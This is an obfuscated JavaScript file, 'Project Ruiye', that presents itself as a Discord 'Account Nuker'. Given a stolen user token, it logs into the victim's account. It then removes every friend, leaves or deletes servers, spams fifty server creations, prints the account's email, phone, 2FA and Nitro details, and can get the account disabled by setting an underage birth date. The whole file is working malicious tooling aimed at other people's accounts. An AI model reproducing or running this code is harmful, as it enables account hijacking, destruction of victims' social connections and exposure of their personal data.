// Project Ruiye created by GenocideIne(GenoIne).
// Includes Account Nuker, and Account Verification with Information Output.

var _0x57f6=['length','premium','N/A','readline-sync','magenta','request','Clear','users','size','#000000','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20██▓███\x20\x20\x20██▀███\x20\x20\x20▒█████\x20\x20\x20▄▄▄██▀▀▀▓█████\x20\x20▄████▄\x20\x20▄▄▄█████▓\x20\x20\x20\x20██▀███\x20\x20\x20█\x20\x20\x20\x20██\x20\x20██▓▓██\x20\x20\x20██▓▓█████\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20▓██░\x20\x20██▒▓██\x20▒\x20██▒▒██▒\x20\x20██▒\x20\x20\x20▒██\x20\x20\x20▓█\x20\x20\x20▀\x20▒██▀\x20▀█\x20\x20▓\x20\x20██▒\x20▓▒\x20\x20\x20▓██\x20▒\x20██▒\x20██\x20\x20▓██▒▓██▒\x20▒██\x20\x20██▒▓█\x20\x20\x20▀\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20▓██░\x20██▓▒▓██\x20░▄█\x20▒▒██░\x20\x20██▒\x20\x20\x20░██\x20\x20\x20▒███\x20\x20\x20▒▓█\x20\x20\x20\x20▄\x20▒\x20▓██░\x20▒░\x20\x20\x20▓██\x20░▄█\x20▒▓██\x20\x20▒██░▒██▒\x20\x20▒██\x20██░▒███\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20▒██▄█▓▒\x20▒▒██▀▀█▄\x20\x20▒██\x20\x20\x20██░▓██▄██▓\x20\x20▒▓█\x20\x20▄\x20▒▓▓▄\x20▄██▒░\x20▓██▓\x20░\x20\x20\x20\x20▒██▀▀█▄\x20\x20▓▓█\x20\x20░██░░██░\x20\x20░\x20▐██▓░▒▓█\x20\x20▄\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20▒██▒\x20░\x20\x20░░██▓\x20▒██▒░\x20████▓▒░\x20▓███▒\x20\x20\x20░▒████▒▒\x20▓███▀\x20░\x20\x20▒██▒\x20░\x20\x20\x20\x20░██▓\x20▒██▒▒▒█████▓\x20░██░\x20\x20░\x20██▒▓░░▒████▒\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20▒▓▒░\x20░\x20\x20░░\x20▒▓\x20░▒▓░░\x20▒░▒░▒░\x20\x20▒▓▒▒░\x20\x20\x20░░\x20▒░\x20░░\x20░▒\x20▒\x20\x20░\x20\x20▒\x20░░\x20\x20\x20\x20\x20\x20░\x20▒▓\x20░▒▓░░▒▓▒\x20▒\x20▒\x20░▓\x20\x20\x20\x20\x20██▒▒▒\x20░░\x20▒░\x20░\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░▒\x20░\x20\x20\x20\x20\x20\x20\x20░▒\x20░\x20▒░\x20\x20░\x20▒\x20▒░\x20\x20▒\x20░▒░\x20\x20\x20\x20░\x20░\x20\x20░\x20\x20░\x20\x20▒\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20░▒\x20░\x20▒░░░▒░\x20░\x20░\x20\x20▒\x20░\x20▓██\x20░▒░\x20\x20░\x20░\x20\x20░\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░░\x20\x20\x20\x20\x20\x20\x20\x20\x20░░\x20\x20\x20░\x20░\x20░\x20░\x20▒\x20\x20\x20░\x20░\x20░\x20\x20\x20\x20\x20\x20░\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░░\x20\x20\x20░\x20\x20░░░\x20░\x20░\x20\x20▒\x20░\x20▒\x20▒\x20░░\x20\x20\x20\x20\x20░\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20░\x20\x20\x20░\x20\x20\x20░\x20\x20\x20\x20\x20\x20░\x20\x20░░\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20░\x20\x20\x20░\x20░\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20░\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','executeMain','SYSTEM:\x20','Log','chalk','\x0a\x20\x20\x20\x20\x20\x20Account\x20Token:\x20','Mozilla/5.0\x20(Windows;\x20U;\x20Windows\x20NT\x205.1;\x20en-US;\x20rv:1.7.12)\x20Gecko/20050915\x20Firefox/1.0.7','PATCH','\x0a\x20\x20\x20\x20\x20\x20Has\x202FA?:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20[00]\x20-\x20Execute\x20Console\x20Clear\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20[0]\x20-\x20Execute\x20Cancel\x20Operation\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20[1]\x20-\x20Execute\x20Account\x20Nuker\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20[2]\x20-\x20Execute\x20Account\x20Information\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20[3]\x20-\x20Execute\x20Account\x20Disable\x0a','Removing\x20Friend:\x20','username','\x0a\x20\x20\x20\x20\x20\x20Has\x20Nitro?:\x20','executeMainFunction','Request','\x0a\x20\x20\x20\x20','setColor','Guilds','Victim','>\x20Your\x20Choice?:\x20','Token\x20\x27','email','Token','del','https://discord.com/api/v6/users/@me/relationships/','push','Regex','user','Discord','login','application/json','https://discord.com/api/v6/users/@me/guilds/','2014-2-16','match','\x0a\x20\x20\x20\x20\x20\x20Discord\x20UserId:\x20','Chalk','\x0a\x20\x20\x20\x20\x20\x20Account\x20Email:\x20','\x0a\x20\x20\x20\x20\x20\x20Discord\x20Username:\x20','Username','https://discord.com/api/v6/guilds','parse','process','Functions','Phone','Leaving\x20Guild:\x20','https://discord.com/api/v6/users/@me','UserId','\x27\x20has\x20encountered\x20an\x20error:\x20','Dependencies','\x0a\x20\x20\x20\x20\x20\x20Has\x20Phone?:\x20','map','Client','Nitro','FriendCount','discord.js','Checking\x20Token:\x20','Successfully\x20disabled\x20Token:\x20','warn','GuildCount','Project\x20Ruiye','executeFunctions','russia','\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20Discord\x20Friend\x20Count:\x20','error','RichEmbed','statusCode','FA2','red','Friends','ready','\x27\x20has\x20been\x20logged\x20into\x20with\x20UserID:\x20','friends','send','\x0a\x20\x20\x20\x20\x20\x20Discord\x20Guild\x20Count:\x20','executeCommands','catch','Your\x20token\x20\x27','>\x20Please\x20Enter\x20a\x20Discord\x20Token:\x20','log','This\x20account\x20has\x20been\x20nuked.','Nuking\x20in\x20Progress\x20for\x20Token:\x20','phone','Email','yellow','\x27\x20is\x20of\x20malformed\x20format.','You\x20have\x20already\x20pulled\x20this\x20tokens\x20information.','green','setDescription','get','clear','post','question','Information','Could\x20not\x20disable\x20token:\x20','Readline','delete','**PROJECT\x20RUIYE**','Bot','setTitle','exit','mfaEnabled','Settings','guilds'];(function(_0x1d57e0,_0x57f69d){var _0x3b5ff8=function(_0x27cdd4){while(--_0x27cdd4){_0x1d57e0['push'](_0x1d57e0['shift']());}};_0x3b5ff8(++_0x57f69d);}(_0x57f6,0xdf));var _0x3b5f=function(_0x1d57e0,_0x57f69d){_0x1d57e0=_0x1d57e0-0x0;var _0x3b5ff8=_0x57f6[_0x1d57e0];return _0x3b5ff8;};global[_0x3b5f('0x1')]={'Regex':/[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g,'Dependencies':{'Readline':require(_0x3b5f('0x6')),'Chalk':require(_0x3b5f('0x11')),'Discord':require(_0x3b5f('0x43')),'Request':require(_0x3b5f('0x8'))},'Functions':{'Log':console[_0x3b5f('0x5b')],'Error':console[_0x3b5f('0x4c')],'Warn':console[_0x3b5f('0x46')],'Clear':console[_0x3b5f('0x66')]},'Victim':{'Bot':![],'Token':![],'Information':![],'Friends':[],'Guilds':[]}},global[_0x3b5f('0xe')]=function(){return Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x7')](_0x3b5f('0xd')));},global[_0x3b5f('0x57')]=function(){return Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x7')](_0x3b5f('0x16')));},global[_0x3b5f('0x1a')]=function(_0x4a4e06){executeMain(),executeCommands();var _0x37930f=Settings[_0x3b5f('0x3d')][_0x3b5f('0x6b')][_0x3b5f('0x68')](Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x7')](_0x3b5f('0x20')));executeFunctions(_0x37930f,_0x4a4e06);},global[_0x3b5f('0x49')]=function(_0x1baefe,_0x51e806){_0x1baefe=='00'&&(Settings[_0x3b5f('0x37')][_0x3b5f('0x9')](),executeMainFunction());_0x1baefe=='0'&&this[_0x3b5f('0x36')][_0x3b5f('0x70')](0x1);if(_0x1baefe=='1'){Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x60')](_0x3b5f('0x5d')+_0x51e806));let _0xdbe1fb=!![],_0x38167e=Settings[_0x3b5f('0x1f')][_0x3b5f('0x1e')],_0x4cc010=Settings[_0x3b5f('0x1f')][_0x3b5f('0x51')];_0x38167e[_0x3b5f('0x3')]>0x0&&_0x38167e[_0x3b5f('0x3f')](_0x4fb65c=>{var _0x5086da={'url':_0x3b5f('0x2c')+_0x4fb65c,'headers':{'User-Agent':_0x3b5f('0x13'),'Authorization':_0x51e806}};Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x2')][_0x3b5f('0x65')](_0x4fb65c)&&(Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x60')](_0x3b5f('0x39')+_0x4fb65c)),Settings[_0x3b5f('0x3d')][_0x3b5f('0x1b')][_0x3b5f('0x6c')](_0x5086da));});_0x4cc010[_0x3b5f('0x3')]>0x0&&_0x4cc010[_0x3b5f('0x3f')](_0x41f7bb=>{var _0x2d80ec={'url':_0x3b5f('0x25')+_0x41f7bb,'headers':{'User-Agent':_0x3b5f('0x13'),'Authorization':_0x51e806}};if(Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0xa')][_0x3b5f('0x65')](_0x41f7bb)){let _0x3d66ea=new Settings[(_0x3b5f('0x3d'))][(_0x3b5f('0x29'))][(_0x3b5f('0x4d'))]()[_0x3b5f('0x6f')](_0x3b5f('0x6d'))[_0x3b5f('0x64')](_0x3b5f('0x5c'))[_0x3b5f('0x1d')](_0x3b5f('0xc'));Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0xa')][_0x3b5f('0x65')](_0x41f7bb)[_0x3b5f('0x55')](_0x3d66ea),Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x60')](_0x3b5f('0x17')+_0x41f7bb)),Settings[_0x3b5f('0x3d')][_0x3b5f('0x1b')][_0x3b5f('0x24')](_0x2d80ec);}});for(i=0x0;i<0x32;i++){var _0x4d2a9f={'url':_0x3b5f('0x34'),'headers':{'User-Agent':_0x3b5f('0x13'),'Authorization':_0x51e806},'json':{'name':_0x3b5f('0x48'),'region':_0x3b5f('0x4a'),'icon':null,'channels':null}};Settings[_0x3b5f('0x3d')][_0x3b5f('0x1b')][_0x3b5f('0x67')](_0x4d2a9f);}}if(_0x1baefe=='2'){if(Settings[_0x3b5f('0x1f')][_0x3b5f('0x69')]!==![])return Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x50')](_0x3b5f('0x62'))),setTimeout(()=>{},0xbb8),executeMainFunction();let _0x509c0a={'Email':'','Token':'','Phone':_0x3b5f('0x5'),'Username':'','UserId':'','FriendCount':'','GuildCount':'','FA2':'','Nitro':''};var _0x881254={'url':_0x3b5f('0x3a'),'headers':{'User-Agent':_0x3b5f('0x13'),'Content-Type':_0x3b5f('0x2b'),'Authorization':_0x51e806}},_0x1d873f=Settings[_0x3b5f('0x3d')][_0x3b5f('0x1b')](_0x881254,(_0x130a46,_0x27ea91,_0x51769b)=>{if(!_0x130a46&&_0x27ea91[_0x3b5f('0x4e')]==0xc8){var _0x588cf2=JSON[_0x3b5f('0x35')](_0x51769b);_0x509c0a[_0x3b5f('0x38')]=_0x588cf2[_0x3b5f('0x5e')];}});_0x509c0a[_0x3b5f('0x5f')]=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')][_0x3b5f('0x22')],_0x509c0a[_0x3b5f('0x23')]=_0x51e806,_0x509c0a[_0x3b5f('0x33')]=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')][_0x3b5f('0x18')],_0x509c0a[_0x3b5f('0x3b')]=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')]['id'],_0x509c0a[_0x3b5f('0x42')]=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')][_0x3b5f('0x54')][_0x3b5f('0xb')],_0x509c0a[_0x3b5f('0x47')]=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x2')][_0x3b5f('0xb')],_0x509c0a[_0x3b5f('0x4f')]=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')][_0x3b5f('0x0')],_0x509c0a[_0x3b5f('0x41')]=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')][_0x3b5f('0x4')],Settings[_0x3b5f('0x1f')][_0x3b5f('0x69')]=_0x509c0a,Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x7')](_0x3b5f('0x32')+_0x509c0a[_0x3b5f('0x33')]+_0x3b5f('0x2f')+_0x509c0a[_0x3b5f('0x3b')]+_0x3b5f('0x19')+_0x509c0a[_0x3b5f('0x41')]+_0x3b5f('0x3e')+_0x509c0a[_0x3b5f('0x38')]+_0x3b5f('0x15')+_0x509c0a[_0x3b5f('0x4f')]+_0x3b5f('0x4b')+_0x509c0a[_0x3b5f('0x42')]+_0x3b5f('0x56')+_0x509c0a[_0x3b5f('0x47')]+_0x3b5f('0x31')+_0x509c0a[_0x3b5f('0x5f')]+_0x3b5f('0x12')+_0x509c0a[_0x3b5f('0x23')]+_0x3b5f('0x1c'))),executeMainFunction();}if(_0x1baefe=='3')var _0x881254={'method':_0x3b5f('0x14'),'url':_0x3b5f('0x3a'),'headers':{'Authorization':_0x51e806},'json':{'date_of_birth':_0x3b5f('0x2d')}},_0x1d873f=Settings[_0x3b5f('0x3d')][_0x3b5f('0x1b')](_0x881254,(_0x4ff91e,_0x2be432,_0x1dff34)=>{!_0x4ff91e&&_0x2be432[_0x3b5f('0x4e')]==0x190?(Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x63')](_0x3b5f('0x45')+_0x51e806)),this[_0x3b5f('0x36')][_0x3b5f('0x70')](0x1)):(Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x50')](_0x3b5f('0x6a')+_0x51e806)),this[_0x3b5f('0x36')][_0x3b5f('0x70')](0x1));});},Settings[_0x3b5f('0x37')][_0x3b5f('0x9')](),executeMain();let _0x27cdd4=Settings[_0x3b5f('0x3d')][_0x3b5f('0x6b')][_0x3b5f('0x68')](Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x7')](_0x3b5f('0x5a')));Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x60')](_0x3b5f('0x44')+_0x27cdd4));!_0x27cdd4[_0x3b5f('0x2e')](Settings[_0x3b5f('0x27')])&&(Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x50')](_0x3b5f('0x59')+_0x27cdd4+_0x3b5f('0x61'))),process[_0x3b5f('0x70')](0x1));Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')]=new Settings[(_0x3b5f('0x3d'))][(_0x3b5f('0x29'))][(_0x3b5f('0x40'))](),Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')]['on'](_0x3b5f('0x52'),()=>{Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x63')](_0x3b5f('0x59')+_0x27cdd4+_0x3b5f('0x53')+Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')]['id']));let _0x5679fc=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x2')],_0xb95ab2=Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x28')][_0x3b5f('0x54')];console[_0x3b5f('0x5b')](_0xb95ab2),_0xb95ab2[_0x3b5f('0xb')]>0x0&&_0xb95ab2[_0x3b5f('0x3f')](_0x2687e5=>{Settings[_0x3b5f('0x1f')][_0x3b5f('0x51')][_0x3b5f('0x26')](_0x2687e5['id']);}),_0x5679fc[_0x3b5f('0xb')]>0x0&&_0x5679fc[_0x3b5f('0x3f')](_0x4f2c71=>{Settings[_0x3b5f('0x1f')][_0x3b5f('0x1e')][_0x3b5f('0x26')](_0x4f2c71['id']);}),Settings[_0x3b5f('0x37')][_0x3b5f('0x9')](),executeMainFunction(_0x27cdd4);}),Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')]['on'](_0x3b5f('0x4c'),Settings[_0x3b5f('0x37')][_0x3b5f('0x10')]),Settings[_0x3b5f('0x1f')][_0x3b5f('0x6e')][_0x3b5f('0x2a')](''+_0x27cdd4)[_0x3b5f('0x58')](_0x5d2df5=>{Settings[_0x3b5f('0x37')][_0x3b5f('0x10')](_0x3b5f('0xf')+Settings[_0x3b5f('0x3d')][_0x3b5f('0x30')][_0x3b5f('0x50')](_0x3b5f('0x21')+_0x27cdd4+_0x3b5f('0x3c')+_0x5d2df5+'.')),process[_0x3b5f('0x70')](0x1);});
